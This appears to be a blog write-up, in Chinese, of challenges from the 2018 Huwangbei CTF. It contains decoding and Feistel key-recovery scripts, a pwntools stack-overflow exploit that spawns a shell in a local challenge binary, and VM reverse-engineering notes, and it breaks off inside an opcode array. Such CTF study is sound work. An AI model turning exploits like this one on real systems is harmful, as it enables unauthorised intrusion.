<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
  
  <title>2018-护网杯 | AssassinQ</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <meta name="keywords" content="ctfwp">
  
  
  
  
  <meta name="description" content="看着大佬们的 wp 复现一波。">
<meta name="keywords" content="ctf,wp">
<meta property="og:type" content="article">
<meta property="og:title" content="2018-护网杯">
<meta property="og:url" content="https://qianfei11.github.io/2018/10/16/2018-护网杯/index.html">
<meta property="og:site_name" content="AssassinQ">
<meta property="og:description" content="看着大佬们的 wp 复现一波。">
<meta property="og:locale" content="default">
<meta property="og:updated_time" content="2019-08-26T01:14:42.849Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="2018-护网杯">
<meta name="twitter:description" content="看着大佬们的 wp 复现一波。">
  
    <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
  
  <link rel="icon" href="/css/images/favicon.ico">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
    
  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">

  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css">
  <link rel="stylesheet" href="/css/fashion.css">
  <link rel="stylesheet" href="/css/glyphs.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->

</head>
</html>


  <body data-spy="scroll" data-target="#toc" data-offset="50">


  
  
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="site-header-image">
    <img id="originBg" width="100%" alt="Hike News" src>
  </div>

  <div id="header-blur" class="site-header-image blur" style="position: absolute; top:0; height: 207px; min-height: 207px; min-width: 100%;">
    <img id="blurBg" width="100%" style="top: 96%" alt="Hike News" src>
  </div>

  <script>
        var imgUrls = "css/images/pose01.jpg".split(",");
        var random = Math.floor((Math.random() * imgUrls.length ));
        if (imgUrls[random].startsWith('http') || imgUrls[random].indexOf('://') >= 0) {
          document.getElementById("originBg").src=imgUrls[random];
          document.getElementById("blurBg").src=imgUrls[random];
        } else {
          document.getElementById("originBg").src='/' + imgUrls[random];
          document.getElementById("blurBg").src='/' + imgUrls[random];
        }
    </script>




<header id="allheader" class="site-header" role="banner" style="width: 100%; position: absolute; top:0; background: rgba(255,255,255,.8);">
  <div class="clearfix container">
      <div class="site-branding">

          <h1 class="site-title">
            
              <a href="/" title="AssassinQ" rel="home"> AssassinQ </a>
            
          </h1>
          
          
            <div class="site-description">ZJGSU-IS-17</div>
          
            
          <nav id="main-navigation" class="main-navigation" role="navigation">
            <a class="nav-open">Menu</a>
            <a class="nav-close">Close</a>

            <div class="clearfix sf-menu">
              <ul id="main-nav" class="menu sf-js-enabled sf-arrows" style="touch-action: pan-y;">
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/">Home</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/archives">Archives</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/tags">Tags</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/about">About</a> </li>
                    
              </ul>
            </div>
          </nav>

      </div>
  </div>
</header>


  <div id="container">
    <div id="wrap">
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;"><article id="post-2018-护网杯" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost">
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      2018-护网杯
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2018/10/16/2018-护网杯/" class="article-date">
	  <time datetime="2018-10-16T10:18:29.000Z" itemprop="datePublished">October 16, 2018</time>
	</a>

       
      

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>看着大佬们的 wp 复现一波。</p>
<a id="more"></a>
<h1 id="迟到的签到题"><a href="#迟到的签到题" class="headerlink" title="迟到的签到题"></a>迟到的签到题</h1><p>充分证明了自己是个签到题选手。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">enc = <span class="string">''</span></span><br><span class="line">enc = base64.b64decode(enc)</span><br><span class="line"><span class="comment"># test = 'flag&#123;'</span></span><br><span class="line"><span class="comment"># for i in range(len(test)):</span></span><br><span class="line"><span class="comment">#     print chr(ord(test) ^ ord(enc)),</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</span><br><span class="line">    flag += chr(ord(enc[i]) ^ ord(<span class="string">'f'</span>))</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<h1 id="FEZ"><a href="#FEZ" class="headerlink" title="FEZ"></a>FEZ</h1><p>给出了一个 py 实现的加密算法，和一个被加密后输出的 log。了解一下之后，大概是菲斯特尔(Feistel)密码，也就是 DES。</p>
<p>分析一下，可以发现比较难的点是中间的多次繁琐的异或，逆向实现较难。通过正向分析加密的过程来观察。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// l即左半部分，r即右半部分</span><br><span class="line">   l + r</span><br><span class="line">1. r + r^l^k1</span><br><span class="line">2. r^l^k1 + r^l^k1^r^k2 =&gt; r^l^k1 + l^k1^k2</span><br><span class="line">3. l^k1^k2 + l^k1^k2^r^l^k1^k3 =&gt; l^k1^k2 + r^k2^k3</span><br><span class="line">4. r^k2^k3 + r^k2^k3^l^k1^k2^k4 =&gt; r^k2^k3 + r^l^k1^k3^k4</span><br><span class="line">5. r^l^k1^k3^k4 + r^l^k1^k3^k4^r^k2^k3^k5 =&gt; r^l^k1^k3^k4 + l^k1^k2^k4^k5</span><br><span class="line">6. l^k1^k2^k4^k5 + l^k1^k2^k4^k5^r^l^k1^k3^k4^k6 =&gt; l^k1^k2^k4^k5 + r^k2^k3^k5^k6</span><br><span class="line">7. r^k2^k3^k5^k6 + r^k2^k3^k5^k6^l^k1^k2^k4^k5^k7 =&gt; r^k2^k3^k5^k6 + r^l^k1^k3^k4^k6^k7</span><br><span class="line"></span><br><span class="line">// 对于m和test来说是一样的</span><br><span class="line">enc1 = xor(test, k) = t_r^k2^k3^k5^k6 + t_r^t_l^k1^k3^k4^k6^k7</span><br><span class="line">enc2 = xor(m, k) = m_r^k2^k3^k5^k6 + m_r^m_l^k1^k3^k4^k6^k7</span><br></pre></td></tr></table></figure>
<p>由于 test 的值是已知的，可以先利用 test 的左右两部分求出 k2356 和 k13467。然后再利用这两个数求出 m 的左右两部分，m 中就含有 flag。脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(a)==len(b)</span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">test = <span class="string">'8664f7f564f097907c082328ebcdc95e8dc37eec3827fd9c93cc84ebb517c5e396c19d12e730ee3f3fb9e84110f9c92b29ddeab60797'</span></span><br><span class="line">enc1 = <span class="string">'4b4ce14cdb9ace2c678b9a64892cc9d5f2a61e7e2dc256877f2fb454c4d37760278640ab1737c62ba4a403acb14a893facfc1819b259'</span></span><br><span class="line">enc2 = <span class="string">'d4c898ee5f6b68d6120bd7fb11f5cf4d0431324c40e0b3a6ae9fbd1f17295be643c45ec7f306063dd1009ae5d62b0803c7909629aba7'</span></span><br><span class="line"></span><br><span class="line">t_l = test.decode(<span class="string">'hex'</span>)[:<span class="number">27</span>]</span><br><span class="line">t_r = test.decode(<span class="string">'hex'</span>)[<span class="number">27</span>:]</span><br><span class="line"></span><br><span class="line">k2356 = xor(enc1.decode(<span class="string">'hex'</span>)[:<span class="number">27</span>], t_r)</span><br><span class="line">k13467 = xor(xor(enc1.decode(<span class="string">'hex'</span>)[<span class="number">27</span>:], t_r), t_l)</span><br><span class="line"></span><br><span class="line">m_r = xor(enc2.decode(<span class="string">'hex'</span>)[:<span class="number">27</span>], k2356)</span><br><span class="line">m_l = xor(xor(enc2.decode(<span class="string">'hex'</span>)[<span class="number">27</span>:], m_r), k13467)</span><br><span class="line">flag = m_l + m_r</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<h1 id="GETTINGSTART"><a href="#GETTINGSTART" class="headerlink" title="GETTINGSTART"></a>GETTINGSTART</h1><p>拿到题目跑了一下，然后 checksec 看看开了什么保护：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">qianfei@qianfeideMacBook-Air ~/ti/2018 huwangbei/GETTINGSTART checksec task_gettingStart_ktQeERc</span><br><span class="line">[*] &apos;/Users/qianfei/ti/2018 huwangbei/GETTINGSTART/task_gettingStart_ktQeERc&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>拖进 ida 里看一看，就是很明显的栈溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">double</span> v8; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  buf = <span class="number">0L</span>L;</span><br><span class="line">  v5 = <span class="number">0L</span>L;</span><br><span class="line">  v6 = <span class="number">0L</span>L;</span><br><span class="line">  v7 = <span class="number">0x7FFFFFFFFFFFFFFF</span>LL;</span><br><span class="line">  v8 = <span class="number">1.797693134862316e308</span>;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"HuWangBei CTF 2018 will be getting start after %lu seconds...\n"</span>, <span class="number">0L</span>L, <span class="number">1.797693134862316e308</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"But Whether it starts depends on you."</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x28</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v7 != <span class="number">0x7FFFFFFFFFFFFFFF</span>LL || v8 != <span class="number">0.1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"HuWangBei CTF 2018 will be getting start after %g seconds...\n"</span>, &amp;buf, v8);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>buf</code>和<code>v7</code>还有<code>v8</code>之间的相对位置也比较清楚，主要就是解决 double 的<code>0.1</code>在内存中存储是什么样子的。通过写一个小的 c 程序得到结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> x = <span class="number">0.1</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> n = *(<span class="keyword">long</span> <span class="keyword">long</span>*)&amp;x;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%llX"</span>, n);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出结果为<code>0x3FB999999999999A</code>，也就是<code>-1</code>的值。exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./task1'</span>)</span><br><span class="line">v7 = <span class="number">0x7FFFFFFFFFFFFFFF</span></span><br><span class="line">v8 = <span class="number">0x3FB999999999999A</span></span><br><span class="line">offset = <span class="number">0x28</span></span><br><span class="line">payload = (p64(v7) + p64(v8)).rjust(offset, <span class="string">'\0'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="RERERE"><a href="#RERERE" class="headerlink" title="RERERE"></a>RERERE</h1><p>此处记录<a href="https://xz.aliyun.com/t/2892#toc-7" target="_blank" rel="noopener">lilac 的 writeup</a></p>
<p>通过搜索字符串找到程序校验位置，分析虚表中的函数，发现这又是一个虚拟机，因此只需要按照套路将每一个虚拟机的指令分析清楚，最终分析得到的虚表是这样的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.rdata:004031CC ; const RE::`vftable&apos;</span><br><span class="line">.rdata:004031CC ??_7RE@@6B@     dd offset assign_hi     ; DATA XREF: sub_4016A0+46↑o</span><br><span class="line">.rdata:004031D0                 dd offset get_par_hi</span><br><span class="line">.rdata:004031D4                 dd offset inc_ip</span><br><span class="line">.rdata:004031D8                 dd offset get_par_lo</span><br><span class="line">.rdata:004031DC                 dd offset dec_assign_hi</span><br><span class="line">.rdata:004031E0                 dd offset add_to_hi</span><br><span class="line">.rdata:004031E4                 dd offset subs_to_hi</span><br><span class="line">.rdata:004031E8                 dd offset inc_assign_hi</span><br><span class="line">.rdata:004031EC                 dd offset xor_to_hi</span><br><span class="line">.rdata:004031F0                 dd offset and_to_hi</span><br><span class="line">.rdata:004031F4                 dd offset mul_to_hi</span><br><span class="line">.rdata:004031F8                 dd offset mod_to_hi</span><br><span class="line">.rdata:004031FC                 dd offset push_hi</span><br><span class="line">.rdata:00403200                 dd offset assign_lo_to_hi</span><br><span class="line">.rdata:00403204                 dd offset load_to_hi</span><br><span class="line">.rdata:00403208                 dd offset push</span><br><span class="line">.rdata:0040320C                 dd offset pop</span><br><span class="line">.rdata:00403210                 dd offset store</span><br><span class="line">.rdata:00403214                 dd offset j_flag_neg1</span><br><span class="line">.rdata:00403218                 dd offset j_flag_1</span><br><span class="line">.rdata:0040321C                 dd offset j_not_flag</span><br><span class="line">.rdata:00403220                 dd offset jmp_bck_cnt</span><br><span class="line">.rdata:00403224                 dd offset cmp_hi_to_lo</span><br><span class="line">.rdata:00403228                 dd offset inc_mem_ptr</span><br><span class="line">.rdata:0040322C                 dd offset dec_mem_ptr</span><br><span class="line">.rdata:00403230                 dd offset xor_block</span><br><span class="line">.rdata:00403234                 dd offset init_regs</span><br><span class="line">.rdata:00403238                 dd offset get_res</span><br><span class="line">.rdata:0040323C                 dd offset execute_vm</span><br></pre></td></tr></table></figure>
<p>其中名字中<code>hi</code>表示目标寄存器编号，<code>lo</code>表示源寄存器编号，<code>execute_vm</code>是执行虚拟机代码的函数，执行程序中硬编码的一段虚拟机指令。在 ida 中新建一个结构，将各个偏移的名字填上虚表函数名，就可以在<code>execute_vm</code>中看到<code>opcode</code>所对应的具体函数是什么了。通过分析这些函数的操作也很容易确定虚拟机的结构：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00000000 Vm</span><br><span class="line">00000000 vtable          dd ?</span><br><span class="line">00000004 reg0            dd ?</span><br><span class="line">00000008 reg1            dd ?</span><br><span class="line">0000000C reg2            dd ?</span><br><span class="line">00000010 cnt             dd ?</span><br><span class="line">00000014 flag            dd ?</span><br><span class="line">00000018 maybe_mem       dd ?</span><br><span class="line">0000001C field_1C        dd ?</span><br><span class="line">00000020 stack           dd ?</span><br><span class="line">00000024 ip_ptr          dd ?</span><br></pre></td></tr></table></figure>
<p>于是可以写 python 脚本将 opcode 还原成易读的伪汇编语言的形式：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">code = [<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">85</span>, <span class="number">5</span>, <span class="number">84</span>, <span class="number">48</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">34</span>, <span class="number">72</span>, <span class="number">2</span>, <span class="number">75</span>, <span class="number">51</span>, <span class="number">73</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">70</span>, <span class="number">84</span>, <span class="number">16</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">77</span>, <span class="number">39</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">84</span>, <span class="number">16</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">68</span>, <span class="number">22</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">84</span>, <span class="number">16</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">68</span>, <span class="number">11</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">84</span>, <span class="number">1</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">68</span>, <span class="number">6</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">5</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">80</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">85</span>, <span class="number">64</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">48</span>, <span class="number">71</span>, <span class="number">17</span>, <span class="number">86</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">2</span>, <span class="number">68</span>, <span class="number">9</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">88</span>, <span class="number">18</span>, <span class="number">83</span>, <span class="number">16</span>, <span class="number">85</span>, <span class="number">43</span>, <span class="number">79</span>, <span class="number">51</span>, <span class="number">180</span>, <span class="number">136</span>, <span class="number">172</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">18</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">3</span>, <span class="number">80</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">48</span>, <span class="number">71</span>, <span class="number">17</span>, <span class="number">86</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">2</span>, <span class="number">68</span>, <span class="number">9</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">88</span>, <span class="number">18</span>, <span class="number">83</span>, <span class="number">16</span>, <span class="number">85</span>, <span class="number">43</span>, <span class="number">79</span>, <span class="number">74</span>, <span class="number">11</span>, <span class="number">148</span>, <span class="number">63</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">18</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">3</span>, <span class="number">80</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">48</span>, <span class="number">71</span>, <span class="number">17</span>, <span class="number">86</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">2</span>, <span class="number">68</span>, <span class="number">9</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">89</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">88</span>, <span class="number">18</span>, <span class="number">83</span>, <span class="number">16</span>, <span class="number">85</span>, <span class="number">43</span>, <span class="number">79</span>, <span class="number">124</span>, <span class="number">92</span>, <span class="number">220</span>, <span class="number">236</span>, <span class="number">84</span>, <span class="number">32</span>, <span class="number">72</span>, <span class="number">18</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">3</span>, <span class="number">80</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">84</span>, <span class="number">48</span>, <span class="number">71</span>, <span class="number">17</span>, <span class="number">86</span>, <span class="number">70</span>, <span class="number">0</span>, <span 